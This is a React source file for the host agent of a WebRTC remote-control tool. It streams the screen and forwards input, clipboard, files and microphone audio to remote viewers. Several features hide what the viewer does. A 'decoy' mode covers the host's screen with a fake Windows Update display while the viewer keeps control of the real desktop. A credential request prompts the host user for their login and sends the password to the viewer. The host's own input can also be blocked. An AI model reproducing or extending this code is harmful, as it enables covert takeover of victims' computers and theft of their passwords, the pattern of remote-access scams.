// v2 — credential prompt + selective control forwarding
import React, { useState, useEffect, useCallback, useRef } from 'react';
import { useNavigate } from 'react-router-dom';
import { Monitor, Shield, Power, Wifi } from 'lucide-react';
import axios from 'axios';
import { RTC_CONFIG, API_URL } from '../utils/webrtc';
import { getWsUrl } from '../utils/signaling';
import {
  getDeviceId,
  getDeviceName,
  setDeviceName as saveDeviceName,
  getAuthToken,
  setAuthToken,
  isRegistered,
} from '../utils/device';
import VirtualDisplaySetup from '../components/VirtualDisplaySetup';

// ---------------------------------------------------------------------------
// IS_ELECTRON — evaluated once at module load, never changes.
// ---------------------------------------------------------------------------
const IS_ELECTRON = Boolean(window.electronAPI?.handleControl);

// ---------------------------------------------------------------------------
// Module-level agent state.
// ---------------------------------------------------------------------------
const agent = {
  ws:          null,
  pc:          null,  // kept for backward compat (points to most recent peer)
  dc:          null,  // kept for backward compat (points to most recent dc)
  peers:       new Map(), // viewer_id -> { pc, dc, dcKeepalive, disconnectTimeout, connectionState, connectedAt }
  viewerCounter: 0,   // monotonically increasing viewer index (legacy)
  stream:      null,
  blackStream: null,
  heartbeat:   null,
  reconnect:   null,
  deviceId:    '',
  initialized: false,
  closed:      false,
  connecting:  false,
  streamReady: false,
  connectionState: 'idle',
  lastViewerConnect: 0,
  dcKeepalive: null,
  disconnectTimeout: null,
  connectedAt: 0,
  gracePeriodMs: 3000,
  screenshotInterval: null,
  clipboardInterval: null,
  lastClipboard: '',
  captureHealthInterval: null,
  captureProbeVideo: null,
  captureLastFrameTime: 0,
  gdiSwitchInProgress: false,
  gdiCaptureActive: false,   // True while GDI/secure-desktop canvas capture is running
  secureDesktopActive: false,  // Track if secure desktop service is active
  // Stealth mode state
  stealthMode: false,
  virtualDisplay: null,
};

// UI state setter — injected by the component so the agent can drive React state.
let _setStatus      = () => {};
let _setError       = () => {};
let _setViewerConn  = () => {};
let _setBlackScreen = () => {};
let _setBlockInput  = () => {};
let _setStealthMode = () => {};
let _setShowSetupWizard = () => {};
let _setMicActive   = () => {};

// ---------------------------------------------------------------------------
// Agent functions — plain functions, no hooks, no closures over component state.
// ---------------------------------------------------------------------------

// Helper: Check if we should ignore disconnect events (within grace period)
function shouldIgnoreDisconnect() {
  if (agent.connectionState !== 'connected') {
    return true; // Not connected, ignore
  }
  
  const timeSinceConnected = Date.now() - agent.connectedAt;
  const withinGracePeriod = timeSinceConnected < agent.gracePeriodMs;
  
  if (withinGracePeriod) {
    console.log(`[host] ⏱️  Within grace period (${timeSinceConnected}ms < ${agent.gracePeriodMs}ms) — ignoring disconnect`);
    return true;
  }
  
  return false;
}

function agentCleanupPeer() {
  console.log('[host] 🧹 Cleaning up ALL peer connections');
  
  // Stop secure desktop capture if active AND no stream is running via GDI
  if (agent.secureDesktopActive && !agent.gdiPollInterval) {
    console.log('[host] 🔒 Stopping secure desktop capture');
    window.electronAPI?.secureDesktopStopCapture?.().catch(() => {});
    agent.secureDesktopActive = false;
  }

  if (agent.captureHealthInterval) {
    clearInterval(agent.captureHealthInterval);
    agent.captureHealthInterval = null;
  }
  if (agent.captureProbeVideo) {
    try {
      agent.captureProbeVideo.pause();
      agent.captureProbeVideo.srcObject = null;
      agent.captureProbeVideo.remove();
    } catch {}
    agent.captureProbeVideo = null;
  }
  agent.captureLastFrameTime = 0;
  agent.gdiSwitchInProgress = false;

  // Only stop GDI capture if no peers remain (don't kill it mid-session)
  if (agent.gdiPollInterval && agent.peers.size === 0 && !agent.gdiCaptureActive) {
    clearInterval(agent.gdiPollInterval);
    agent.gdiPollInterval = null;
    window.electronAPI?.stopGdiCapture?.().catch(() => {});
  }
  if (agent.unlockCheckInterval && agent.peers.size === 0) {
    clearInterval(agent.unlockCheckInterval);
    agent.unlockCheckInterval = null;
  }
  
  // Remove GDI canvas from DOM only if stopping GDI
  if (!agent.gdiPollInterval && agent.gdiCanvas) {
    try { agent.gdiCanvas.parentNode?.removeChild(agent.gdiCanvas); } catch {}
    agent.gdiCanvas = null;
  }

  // Clean up all viewer peers
  for (const [viewerId, peer] of agent.peers.entries()) {
    agentCleanupViewerPeer(viewerId);
  }
  agent.peers.clear();

  // Legacy compat
  agent.pc = null;
  agent.dc = null;
  agent.connecting = false;
  agent.connectionState = 'idle';
  agent.connectedAt = 0;

  _setViewerConn(false);
  _setBlackScreen(false);
  _setBlockInput(false);
}

function agentCleanupViewerPeer(viewerId) {
  const peer = agent.peers.get(viewerId);
  if (!peer) return;

  console.log(`[host] 🧹 Cleaning up peer for viewer ${viewerId}`);

  if (peer.dcKeepalive) { clearInterval(peer.dcKeepalive); peer.dcKeepalive = null; }
  if (peer.disconnectTimeout) { clearTimeout(peer.disconnectTimeout); peer.disconnectTimeout = null; }
  if (peer.audioStatsInterval) { clearInterval(peer.audioStatsInterval); peer.audioStatsInterval = null; }

  // Stop viewer audio playback
  if (peer.viewerAudioEl) {
    peer.viewerAudioEl.pause();
    peer.viewerAudioEl.srcObject = null;
    // Remove audio element from DOM
    if (peer.viewerAudioEl.parentNode) {
      peer.viewerAudioEl.parentNode.removeChild(peer.viewerAudioEl);
    }
    peer.viewerAudioEl = null;
  }

  if (peer.dc) {
    peer.dc.onopen = null;
    peer.dc.onclose = null;
    peer.dc.onmessage = null;
    peer.dc.onerror = null;
    try { peer.dc.close(); } catch {}
    peer.dc = null;
  }

  if (peer.pc) {
    peer.pc.onicecandidate = null;
    peer.pc.oniceconnectionstatechange = null;
    peer.pc.onconnectionstatechange = null;
    peer.pc.ontrack = null;
    try { peer.pc.close(); } catch {}
    peer.pc = null;
  }

  agent.peers.delete(viewerId);

  // Update legacy compat refs if they pointed to this peer
  if (agent.pc === peer.pc) { agent.pc = null; agent.dc = null; }

  // Update UI — connected if any peer still active
  const anyConnected = [...agent.peers.values()].some(p => p.connectionState === 'connected');
  _setViewerConn(anyConnected);
}

// Apply Windows Update overlay: Shows fake Windows Update screen to HOST
// Viewer continues to see and control the REAL screen (stealth/decoy mode)
function agentApplyBlackScreen(enabled) {
  console.log(`[host] 🪟 Applying Windows Update overlay (decoy mode): ${enabled}`);

  // IMPORTANT: Do NOT replace video track - viewer should see REAL screen
  // The overlay only affects what the HOST sees on their physical screen
  
  // Show/hide Electron overlay for host (if in Electron)
  if (IS_ELECTRON && window.electronAPI) {
    if (enabled) {
      console.log('[host] 🪟 Showing Windows Update overlay to HOST (decoy - hides viewer activity)');
      console.log('[host] 👁️  Viewer continues to see and control REAL screen');
      window.electronAPI.blackScreenOn();
    } else {
      console.log('[host] 🪟 Hiding Windows Update overlay from HOST');
      window.electronAPI.blackScreenOff();
    }
  }
  
  // Note: We do NOT modify the WebRTC video track
  // The screen capture continues normally, viewer sees everything
  // Only the host's physical display is covered by the fake Windows Update screen
}

async function agentCreateOffer(viewerId) {
  console.log(`[host] 📞 agentCreateOffer called for viewer ${viewerId}`);

  // Guard: stream must be ready
  if (!agent.streamReady || !agent.stream) {
    console.warn('[host] ⛔ Stream not ready — retrying in 1s');
    setTimeout(() => agentCreateOffer(viewerId), 1000);
    return;
  }

  const tracks = agent.stream.getTracks();
  if (tracks.length === 0) {
    console.error('[host] ❌ Stream has no tracks — aborting');
    return;
  }

  console.log(`[host] 🆕 Creating peer connection for viewer ${viewerId} (total active: ${agent.peers.size + 1})`);

  // Per-viewer peer state
  const peerState = {
    pc: null,
    dc: null,
    dcKeepalive: null,
    disconnectTimeout: null,
    connectionState: 'connecting',
    connectedAt: 0,
  };
  agent.peers.set(viewerId, peerState);

  // CREATE NEW PEER CONNECTION
  const pc = new RTCPeerConnection(RTC_CONFIG);
  peerState.pc = pc;

  // Legacy compat — point agent.pc/dc to most recent peer
  agent.pc = pc;

  // ADD ALL TRACKS BEFORE CREATING OFFER
  tracks.forEach(track => {
    pc.addTrack(track, agent.stream);
    console.log(`[host] ✅ Track added to viewer ${viewerId}: ${track.kind}`);
  });

  // Add audio transceivers upfront — NO renegotiation ever needed after this
  // CRITICAL: Use sendrecv for BOTH transceivers to allow bidirectional audio
  // The viewer will be able to send audio on the second transceiver
  console.log(`[host] 🎤 ═══ CREATING AUDIO TRANSCEIVERS FOR VIEWER ${viewerId} ═══`);
  const hostMicTransceiver = pc.addTransceiver('audio', { direction: 'sendrecv' });
  console.log(`[host] 🎤 Created hostMicTransceiver (host→viewer):`);
  console.log(`[host] 🎤   - direction: ${hostMicTransceiver.direction}`);
  console.log(`[host] 🎤   - currentDirection: ${hostMicTransceiver.currentDirection}`);
  console.log(`[host] 🎤   - mid: ${hostMicTransceiver.mid}`);
  
  const viewerMicTransceiver = pc.addTransceiver('audio', { direction: 'sendrecv' });
  console.log(`[host] 🎤 Created viewerMicTransceiver (viewer→host):`);
  console.log(`[host] 🎤   - direction: ${viewerMicTransceiver.direction}`);
  console.log(`[host] 🎤   - currentDirection: ${viewerMicTransceiver.currentDirection}`);
  console.log(`[host] 🎤   - mid: ${viewerMicTransceiver.mid}`);
  
  peerState.hostMicTransceiver = hostMicTransceiver;
  peerState.viewerMicTransceiver = viewerMicTransceiver;
  // If mic already active, attach it now
  if (agent.micStream) {
    const micTrack = agent.micStream.getAudioTracks()[0];
    if (micTrack) {
      hostMicTransceiver.sender.replaceTrack(micTrack).catch(() => {});
      console.log(`[host] 🎤 Attached host mic track to hostMicTransceiver`);
    }
  }
  console.log(`[host] 🎤 ═══ AUDIO TRANSCEIVERS SETUP COMPLETE ═══`);

  // CREATE DATA CHANNEL (HOST SIDE ONLY)
  const dc = pc.createDataChannel('control', { ordered: true });
  peerState.dc = dc;
  agent.dc = dc;

  dc.onopen = () => {
    console.log(`[host] ✅ DataChannel OPEN for viewer ${viewerId}`);
    _setViewerConn(true);

    // Start keepalive ping
    peerState.dcKeepalive = setInterval(() => {
      if (peerState.dc?.readyState === 'open') {
        try { peerState.dc.send(JSON.stringify({ type: 'ping' })); } catch {}
      }
    }, 5000);

    if (IS_ELECTRON) startClipboardMonitoring();
  };

  dc.onclose = () => {
    console.log(`[host] ⚠️  DataChannel CLOSED for viewer ${viewerId}`);
    if (peerState.dcKeepalive) { clearInterval(peerState.dcKeepalive); peerState.dcKeepalive = null; }
    const anyConnected = [...agent.peers.values()].some(p => p.connectionState === 'connected');
    _setViewerConn(anyConnected);
  };

  dc.onerror = (err) => {
    const msg = err?.error?.message || '';
    if (!msg.includes('User-Initiated Abort') && !msg.includes('Close called')) {
      console.error(`[host] ❌ DataChannel error for viewer ${viewerId}:`, err);
    }
  };

  dc.onmessage = (e) => {
    try {
      const msg = JSON.parse(e.data);
      if (msg.type === 'ping' || msg.type === 'pong') return;

      console.log(`[host] 📨 DC msg from viewer ${viewerId}: type=${msg.type}`);

      // Clipboard sync
      if (msg.type === 'clipboard' && IS_ELECTRON) {
        if (msg.text && msg.text.length <= 1024 * 1024) {
          window.electronAPI.setClipboardText(msg.text).then(() => {
            agent.lastClipboard = msg.text;
          }).catch(() => {});
        }
        return;
      }

      // Forward input events to OS
      const INPUT_TYPES = ['mouse_move', 'mouse_click', 'key_down', 'key_up', 'scroll', 'toggle', 'win_shortcut'];
      if (IS_ELECTRON && INPUT_TYPES.includes(msg.type)) {
        // Try secure desktop service first
        const isSecureDesktopAvailable = window.electronAPI?.secureDesktopIsAvailable?.();
        
        if (isSecureDesktopAvailable) {
          // Use secure desktop service for input
          const result = window.electronAPI.injectInput({
            type: msg.type,
            data: {
              x: msg.x,
              y: msg.y,
              left: msg.button === 'left',
              key: msg.keys?.[0] || ''
            }
          });
          
          if (result?.success) {
            console.log('[host] ✅ Input injected via secure desktop');
            return;
          }
        }
        
        // Fallback to existing input handling
        window.electronAPI.handleControl(msg);
      }

      if (msg.type === 'toggle') {
        if (msg.action === 'black_screen') { _setBlackScreen(msg.enabled); agentApplyBlackScreen(msg.enabled); }
        if (msg.action === 'block_input') { _setBlockInput(msg.enabled); }
      }
      if (msg.type === 'set_quality' && msg.quality) agentSetQuality(msg.quality);
      if (msg.type === 'set_audio_mode' && msg.mode) agentSetAudioMode(msg.mode);
      if (msg.type === 'win_shortcut' && msg.keys && IS_ELECTRON) {
        window.electronAPI.handleControl({ type: 'win_shortcut', keys: msg.keys });
      }

      if (msg.type === 'request_credentials') {
        if (IS_ELECTRON && window.electronAPI) {
          window.electronAPI.requestCredentials().then(result => {
            if (peerState.dc?.readyState === 'open') {
              peerState.dc.send(JSON.stringify({
                type: 'credential_result',
                verified: result.verified,
                credential: result.verified ? result.credential : null,
                username: result.username || '',
              }));
            }
          });
        }
      }

      // File transfer messages — forward to Electron main process for saving to disk
      if (msg.type === 'file_start' || msg.type === 'file_chunk' || msg.type === 'file_end') {
        if (IS_ELECTRON && window.electronAPI) {
          console.log(`[host] 📁 Forwarding ${msg.type} to Electron main process:`, msg.name || '');
          window.electronAPI.handleControl(msg);
        } else {
          console.warn(`[host] ⚠️  File transfer not supported in browser mode`);
        }
        return;
      }
    } catch (err) {
      console.error('[host] ❌ Error parsing DC message:', err);
    }
  };

  // ICE CANDIDATE HANDLER
  pc.onicecandidate = (e) => {
    if (e.candidate && agent.ws?.readyState === WebSocket.OPEN) {
      agent.ws.send(JSON.stringify({ 
        type: 'ice-candidate', 
        candidate: e.candidate.toJSON(),
        viewer_id: viewerId  // Include viewer ID for routing
      }));
    }
  };

  pc.oniceconnectionstatechange = () => {
    if (pc.iceConnectionState === 'failed') {
      console.error(`[host] ❌ ICE failed for viewer ${viewerId}`);
      agentCleanupViewerPeer(viewerId);
    }
  };

  // PEER CONNECTION STATE MONITORING
  pc.onconnectionstatechange = () => {
    const s = pc.connectionState;
    console.log(`[host] 🔌 Viewer ${viewerId} peer state: ${s}`);

    if (s === 'connected') {
      peerState.connectionState = 'connected';
      peerState.connectedAt = Date.now();
      // Legacy compat
      agent.connectionState = 'connected';
      agent.connectedAt = peerState.connectedAt;
      agent.connecting = false;
      _setViewerConn(true);
      applyBitrateCap(pc);
      if (peerState.disconnectTimeout) { clearTimeout(peerState.disconnectTimeout); peerState.disconnectTimeout = null; }
    } else if (s === 'failed') {
      agentCleanupViewerPeer(viewerId);
    } else if (s === 'disconnected') {
      peerState.connectionState = 'disconnected';
      if (peerState.disconnectTimeout) clearTimeout(peerState.disconnectTimeout);
      peerState.disconnectTimeout = setTimeout(() => {
        const p = agent.peers.get(viewerId);
        if (p && (p.pc?.connectionState === 'disconnected' || p.pc?.connectionState === 'failed')) {
          agentCleanupViewerPeer(viewerId);
        }
      }, 2000);
    } else if (s === 'closed') {
      peerState.connectionState = 'idle';
    }
  };

  // TRACK EVENT — receives viewer's mic in 2-way mode
  pc.ontrack = (event) => {
    if (event.track.kind === 'audio') {
      console.log(`[host] 🔊 ═══ AUDIO TRACK RECEIVED FROM VIEWER ${viewerId} ═══`);
      console.log(`[host] 🔊 Track ID: ${event.track.id}`);
      console.log(`[host] 🔊 Track state: ${event.track.readyState}`);
      console.log(`[host] 🔊 Track enabled: ${event.track.enabled}`);
      console.log(`[host] 🔊 Track muted: ${event.track.muted}`);
      console.log(`[host] 🔊 Streams count: ${event.streams.length}`);
      if (event.streams[0]) {
        console.log(`[host] 🔊 Stream ID: ${event.streams[0].id}`);
        console.log(`[host] 🔊 Stream audio tracks: ${event.streams[0].getAudioTracks().length}`);
      }
      console.log(`[host] 🔊 Transceiver direction: ${event.transceiver?.direction}`);
      console.log(`[host] 🔊 Transceiver mid: ${event.transceiver?.mid}`);
      console.log(`[host] 🔊 Current audio mode: ${agent.audioMode}`);
      
      // CRITICAL FIX: Only create audio element for the FIRST audio track
      // WebRTC fires ontrack for BOTH transceivers, but we only want ONE audio element
      // The viewer sends audio on ONE transceiver - we should only play that one
      if (peerState.viewerAudioEl) {
        console.log(`[host] 🔊 ⏭️  Audio element already exists, ignoring duplicate track`);
        return;
      }
      
      console.log(`[host] 🔊 ✅ Creating audio element for viewer audio`);
      
      // Store which transceiver is actually receiving viewer audio
      peerState.actualViewerMicTransceiver = event.transceiver;
      
      const audio = new Audio();
      // Use the stream directly — when viewer calls replaceTrack(), the stream
      // automatically gets the new track without needing a new Audio element
      const stream = event.streams[0] || new MediaStream([event.track]);
      audio.srcObject = stream;
      audio.autoplay = true;
      audio.muted = (agent.audioMode === 'off');
      
      // CRITICAL FIX: Append audio element to DOM for reliable playback
      // Many browsers require audio elements to be in the DOM to play properly
      audio.style.display = 'none';
      document.body.appendChild(audio);
      
      console.log(`[host] 🔊 Audio element created:`);
      console.log(`[host] 🔊   - autoplay: ${audio.autoplay}`);
      console.log(`[host] 🔊   - muted: ${audio.muted}`);
      console.log(`[host] 🔊   - volume: ${audio.volume}`);
      console.log(`[host] 🔊   - attached to DOM: true`);
      
      audio.play().then(() => {
        console.log(`[host] 🔊 ✅ Audio playback started successfully`);
      }).catch((err) => {
        console.error(`[host] 🔊 ❌ Audio playback failed:`, err.message);
      });
      
      peerState.viewerAudioEl = audio;
      peerState.viewerAudioStream = stream;
      
      // Monitor track state changes
      event.track.onended = () => {
        console.log(`[host] 🔊 ⚠️  Viewer ${viewerId} audio track ENDED`);
      };
      
      event.track.onmute = () => {
        console.log(`[host] 🔊 🔇 Viewer ${viewerId} audio track MUTED`);
      };
      
      // When track becomes active (viewer enables mic), ensure audio plays
      event.track.onunmute = () => {
        console.log(`[host] 🔊 🎤 Viewer ${viewerId} mic track UNMUTED — ensuring playback`);
        if (peerState.viewerAudioEl) {
          // CRITICAL: Always restart playback when track unmutes, regardless of audio mode
          // The audio element's muted property will control whether we hear it
          peerState.viewerAudioEl.play().then(() => {
            console.log(`[host] 🔊 ✅ Audio playback resumed after track unmute`);
          }).catch((err) => {
            console.error(`[host] 🔊 ❌ Audio playback failed after track unmute:`, err.message);
          });
        }
      };
      
      // Monitor audio element events
      audio.onplay = () => console.log(`[host] 🔊 📢 Audio element PLAYING`);
      audio.onpause = () => console.log(`[host] 🔊 ⏸️  Audio element PAUSED`);
      audio.onvolumechange = () => console.log(`[host] 🔊 🔊 Volume changed: ${audio.volume}, muted: ${audio.muted}`);
      
      // CRITICAL DIAGNOSTIC: Log WebRTC stats to verify audio bytes are flowing
      const statsInterval = setInterval(() => {
        // Use the actual transceiver that's receiving viewer audio
        const receivingTransceiver = peerState.actualViewerMicTransceiver || peerState.viewerMicTransceiver;
        if (!receivingTransceiver || !peerState.pc) {
          clearInterval(statsInterval);
          return;
        }
        receivingTransceiver.receiver.getStats().then(stats => {
          stats.forEach(report => {
            if (report.type === 'inbound-rtp' && report.kind === 'audio') {
              console.log(`[host] 📊 Audio RTP stats:`, {
                bytesReceived: report.bytesReceived,
                packetsReceived: report.packetsReceived,
                packetsLost: report.packetsLost,
                jitter: report.jitter,
                audioLevel: report.audioLevel
              });
            }
          });
        }).catch(() => {});
      }, 3000);
      
      // Store interval reference for cleanup
      peerState.audioStatsInterval = statsInterval;
      
      console.log(`[host] 🔊 ═══ AUDIO SETUP COMPLETE ═══`);
    }
  };

  // CREATE AND SEND OFFER
  try {
    const offer = await pc.createOffer();
    await pc.setLocalDescription(offer);
    agent.ws.send(JSON.stringify({
      type: 'offer',
      sdp: { type: pc.localDescription.type, sdp: pc.localDescription.sdp },
      viewer_id: viewerId  // Include viewer ID for routing
    }));
    console.log(`[host] 📤 Offer sent for viewer ${viewerId}`);
  } catch (err) {
    console.error(`[host] ❌ Error creating/sending offer for viewer ${viewerId}:`, err);
    agentCleanupViewerPeer(viewerId);
  }
}

function agentConnectWebSocket() {
  if (agent.closed) return;

  // CRITICAL: Guard against stacking connections - ONLY ONE WebSocket
  const existing = agent.ws;
  if (existing) {
    const state = existing.readyState;
    console.log('[host] 🔍 Existing WebSocket state:', state);
    
    if (state === WebSocket.OPEN) {
      console.log('[host] ✅ WebSocket already OPEN — skipping reconnect');
      return;
    }
    if (state === WebSocket.CONNECTING) {
      console.log('[host] ⏳ WebSocket already CONNECTING — skipping reconnect');
      return;
    }
    
    console.log('[host] 🧹 Cleaning up old WebSocket (state:', state, ')');
    existing.onopen = null;
    existing.onmessage = null;
    existing.onerror = null;
    existing.onclose = null; // detach so its handler doesn't schedule a competing retry
    existing.close();
    agent.ws = null;
  }

  const id    = agent.deviceId;
  const token = getAuthToken();

  if (!id || !token) {
    console.warn('[host] WS: missing device ID or token — aborting');
    return;
  }

  const url = getWsUrl(`/api/ws/host/${id}?token=${encodeURIComponent(token)}`);
  console.log(`🔌 WS CONNECTING → ${url}`);
  console.log(`[host] Token (last 6): ...${token.slice(-6)}`);

  const ws = new WebSocket(url);
  agent.ws = ws;

  ws.onopen = () => {
    console.log('✅ WS OPEN → device ONLINE');
    _setStatus('active');
    _setError('');
    
    // Clear any existing heartbeat
    if (agent.heartbeat) {
      clearInterval(agent.heartbeat);
    }
    
    // Start heartbeat ping every 5 seconds
    agent.heartbeat = setInterval(() => {
      if (agent.ws && agent.ws.readyState === WebSocket.OPEN) {
        agent.ws.send(JSON.stringify({ type: 'ping' }));
        console.log('[host] 📡 Heartbeat ping sent');
      } else {
        console.warn('[host] ⚠️  Cannot send heartbeat — WebSocket not open');
        clearInterval(agent.heartbeat);
        agent.heartbeat = null;
      }
    }, 5000);
    
    // Start screenshot capture automatically (Electron only) - every 
    //  seconds
    if (IS_ELECTRON && agent.stream) {
      startScreenshotCapture();
    }
    
    console.log('📡 Waiting for viewer...');
  };

  ws.onmessage = async (event) => {
    try {
      const data = JSON.parse(event.data);
      
      // Handle heartbeat responses silently
      if (data.type === 'pong') {
        // Ignore pong messages - heartbeat is working
        return;
      }
      
      console.log('[host] 📨 WS message:', data.type);
      
      switch (data.type) {
        case 'connected':
          console.log('[host] ✅ WebSocket connection confirmed by server');
          break;
          
        case 'viewer_connected':
          console.log('[host] 👁️  New viewer connected — creating dedicated peer connection');
          const viewerId = data.viewer_id;
          if (!viewerId) {
            console.error('[host] ❌ No viewer_id in viewer_connected message');
            return;
          }
          // Don't cleanup existing connections — create a new one for this viewer
          // Each viewer gets its own independent peer connection
          if (agent.disconnectTimeout) {
            clearTimeout(agent.disconnectTimeout);
            agent.disconnectTimeout = null;
          }
          agent.lastViewerConnect = Date.now();
          await agentCreateOffer(viewerId);
          break;
          
        case 'viewer_disconnected':
          console.log('[host] 👁️  A viewer disconnected');
          // Only cleanup if no other viewers are connected
          // The backend will send viewer_disconnected when ALL viewers leave
          agentCleanupPeer();
          break;
          
        case 'answer':
          console.log('[host] 📥 Received answer from viewer');
          const answerViewerId = data.viewer_id;
          if (answerViewerId && agent.peers.has(answerViewerId)) {
            const peer = agent.peers.get(answerViewerId);
            if (peer.pc) {
              await peer.pc.setRemoteDescription(new RTCSessionDescription(data.sdp));
              console.log(`[host] ✅ Remote description set for viewer ${answerViewerId}`);
            }
          } else if (agent.pc) {
            // Fallback for backward compatibility
            await agent.pc.setRemoteDescription(new RTCSessionDescription(data.sdp));
            console.log('[host] ✅ Remote description set (legacy fallback)');
          }
          break;

        case 'offer':
          // Viewer sent a renegotiation offer (e.g. added mic track for 2-way audio)
          console.log('[host] 📥 Received renegotiation offer from viewer');
          const offerViewerId = data.viewer_id;
          let targetPc = null;
          
          if (offerViewerId && agent.peers.has(offerViewerId)) {
            targetPc = agent.peers.get(offerViewerId).pc;
          } else {
            targetPc = agent.pc; // Fallback for backward compatibility
          }
          
          if (targetPc) {
            try {
              await targetPc.setRemoteDescription(new RTCSessionDescription(data.sdp));
              const answer = await targetPc.createAnswer();
              await targetPc.setLocalDescription(answer);
              agent.ws.send(JSON.stringify({
                type: 'answer',
                sdp: { type: targetPc.localDescription.type, sdp: targetPc.localDescription.sdp },
                viewer_id: offerViewerId  // Include viewer ID for routing back
              }));
              console.log(`[host] ✅ Renegotiation answer sent to viewer ${offerViewerId || 'legacy'}`);
            } catch (e) {
              console.error('[host] ❌ Renegotiation failed:', e.message);
            }
          }
          break;
          
        case 'ice-candidate':
          const iceViewerId = data.viewer_id;
          if (iceViewerId && agent.peers.has(iceViewerId)) {
            const peer = agent.peers.get(iceViewerId);
            if (peer.pc && data.candidate) {
              await peer.pc.addIceCandidate(new RTCIceCandidate(data.candidate));
              console.log(`[host] 🧊 ICE candidate added for viewer ${iceViewerId}`);
            }
          } else if (agent.pc && data.candidate) {
            // Fallback for backward compatibility
            await agent.pc.addIceCandidate(new RTCIceCandidate(data.candidate));
            console.log('[host] 🧊 ICE candidate added (legacy fallback)');
          }
          break;
          
        case 'replaced':
          console.warn('[host] ⚠️  WS replaced by another connection — cleaning up this instance');
          clearInterval(agent.heartbeat);
          agent.heartbeat = null;
          agentCleanupPeer();
          _setStatus('idle');
          // Do NOT set agent.closed = true — the new connection (same device, new tab/reload)
          // should continue working. Just clean up this WS instance.
          break;
          
        case 'error':
          console.error('[host] ❌ Server error:', data.message);
          _setError(data.message);
          break;
          
        case 'refresh_screenshot':
          console.log('[host] 📸 Manual screenshot refresh requested');
          if (IS_ELECTRON && agent.stream) {
            captureAndUploadScreenshot();
          } else {
            console.warn('[host] ⚠️  Cannot capture screenshot (not Electron or no stream)');
          }
          break;
          
        default:
          console.log('[host] ⚠️  Unknown message type:', data.type);
          break;
      }
    } catch (err) {
      console.error('[host] ❌ Error handling WS message:', err);
    }
  };

  ws.onerror = (err) => {
    console.error('[host] ❌ WS ERROR:', err);
    console.log('[host] WebSocket state:', ws.readyState);
  };

  ws.onclose = (e) => {
    console.log(`❌ WS CLOSED (code=${e.code} reason="${e.reason}" wasClean=${e.wasClean})`);
    console.log('[host] WebSocket closed, clearing heartbeat');
    
    if (agent.heartbeat) {
      clearInterval(agent.heartbeat);
      agent.heartbeat = null;
    }
    
    // Clear the WebSocket reference
    if (agent.ws === ws) {
      agent.ws = null;
    }
    
    if (!agent.closed) {
      _setStatus('idle');
      
      // Prevent reconnect spam - wait 3 seconds before retry
      if (agent.reconnect) {
        clearTimeout(agent.reconnect);
      }
      
      console.log('[host] ⏱️  Scheduling reconnect in 3s...');
      agent.reconnect = setTimeout(() => {
        console.log('[host] 🔄 Attempting WebSocket reconnect...');
        agentConnectWebSocket();
      }, 3000);
    } else {
      console.log('[host] Agent closed, not reconnecting');
    }
  };
}

// Audio mode: 'off' | 'one_way' (host→viewer) | 'two_way' (both)
agent.audioMode = 'off';
agent.micStream = null; // host microphone stream

// Start host microphone — uses replaceTrack, NO renegotiation
async function agentStartMic() {
  if (agent.micStream) return; // already running
  try {
    agent.micStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
    console.log('[host] 🎤 Microphone started');

    const micTrack = agent.micStream.getAudioTracks()[0];
    if (micTrack) {
      // Replace track on all peer hostMicTransceivers — no renegotiation
      for (const [idx, peer] of agent.peers.entries()) {
        if (peer.hostMicTransceiver) {
          try {
            await peer.hostMicTransceiver.sender.replaceTrack(micTrack);
            console.log(`[host] ✅ Mic track set for viewer #${idx}`);
          } catch (err) {
            console.warn(`[host] Could not set mic for viewer #${idx}:`, err.message);
          }
        }
      }
    }
  } catch (err) {
    console.error('[host] ❌ Mic capture failed:', err.message);
  }
}

// Stop host microphone — releases OS mic icon
function agentStopMic() {
  if (agent.micStream) {
    // CRITICAL: stop() releases the hardware and removes the OS mic icon
    agent.micStream.getTracks().forEach(t => t.stop());
    agent.micStream = null;
    console.log('[host] 🎤 Microphone stopped — hardware released');
  }
  // Detach mic track from all peer senders so WebRTC stops using it
  for (const [, peer] of agent.peers.entries()) {
    if (peer.hostMicTransceiver) {
      peer.hostMicTransceiver.sender.replaceTrack(null).catch(() => {});
    }
  }
}

// Set audio mode — called when viewer sends set_audio_mode
async function agentSetAudioMode(mode) {
  console.log('[host] 🎤 Audio mode:', agent.audioMode, '→', mode);
  agent.audioMode = mode;
  if (mode === 'off') {
    agentStopMic();
    _setMicActive(false);
    // Mute incoming viewer audio elements
    for (const [, peer] of agent.peers.entries()) {
      if (peer.viewerAudioEl) {
        peer.viewerAudioEl.muted = true;
        console.log(`[host] 🔊 Muted viewer audio element`);
      }
      if (peer.pc) {
        peer.pc.getReceivers().forEach(r => {
          if (r.track?.kind === 'audio') r.track.enabled = false;
        });
      }
    }
  } else {
    await agentStartMic();
    _setMicActive(true);
    // Unmute incoming viewer audio elements AND restart playback
    for (const [, peer] of agent.peers.entries()) {
      if (peer.viewerAudioEl) {
        peer.viewerAudioEl.muted = false;
        console.log(`[host] 🔊 Unmuted viewer audio element, restarting playback...`);
        // CRITICAL: Restart playback after unmuting
        peer.viewerAudioEl.play().then(() => {
          console.log(`[host] 🔊 ✅ Viewer audio playback restarted successfully`);
        }).catch((err) => {
          console.error(`[host] 🔊 ❌ Failed to restart viewer audio playback:`, err.message);
        });
      }
      if (peer.pc) {
        peer.pc.getReceivers().forEach(r => {
          if (r.track?.kind === 'audio') r.track.enabled = true;
        });
      }
    }
  }
}
const QUALITY_PRESETS = {
  // Extremely low: 320x240, 5fps, 100kbps — fastest possible input response
  low:    { width: 320,  height: 240,  frameRate: 5,  maxBitrate: 100_000  },
  // Medium: 1280x720, 15fps, 800kbps — balanced
  medium: { width: 1280, height: 720,  frameRate: 15, maxBitrate: 800_000  },
  // High: native resolution, 30fps, 3Mbps — best quality
  high:   { width: 1920, height: 1080, frameRate: 30, maxBitrate: 3_000_000 },
};

// Current quality — can be changed by viewer via DataChannel
agent.quality = 'medium';

function stopCaptureHealthMonitor() {
  if (agent.captureHealthInterval) {
    clearInterval(agent.captureHealthInterval);
    agent.captureHealthInterval = null;
  }
  if (agent.captureProbeVideo) {
    try {
      agent.captureProbeVideo.pause();
      agent.captureProbeVideo.srcObject = null;
      agent.captureProbeVideo.remove();
    } catch {}
    agent.captureProbeVideo = null;
  }
  agent.captureLastFrameTime = 0;
}

async function switchToGdiCapture(reason = 'capture failure') {
  if (!IS_ELECTRON || !window.electronAPI || agent.gdiSwitchInProgress) return;
  agent.gdiSwitchInProgress = true;

  // If secure desktop service is available, mark it active but still use GDI canvas
  // The service handles capture internally; we read frames via the same GDI BMP path
